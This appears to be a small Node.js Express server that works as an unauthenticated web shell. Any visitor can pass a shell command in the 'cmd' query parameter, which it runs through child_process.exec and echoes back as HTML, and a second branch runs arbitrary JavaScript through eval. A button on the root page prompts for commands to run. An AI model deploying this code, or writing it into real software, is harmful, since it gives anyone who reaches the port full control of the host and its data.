const { exec } = require('child_process');
const express = require("express");



const app = express();


app.get("/", function(req, res) {
  var r = req.query
  if(r.do == "exe" && r.cmd) {
    exec(r.cmd, (n, o, e) => {
      if (n) res.send("Error")
      res.send(`Out:<pre>${o}</pre><br /><br />Err:<pre>${e}</pre>`)
    });
  };
  if(r.do == "n" && r.cmd) {
    res.send(eval(r.cmd));
  };
  if(!r.do) {
    res.send(`
<html>
<body>
<button type="button" onclick="window.location.href = '?do=exe&cmd=' + prompt('CMD','echo test')">Exe (terminal)</button>
</body>
</html>
`)
  }
});

const listener = app.listen(process.env.PORT, function() {
  console.log("Listening on port " + listener.address().port);
});
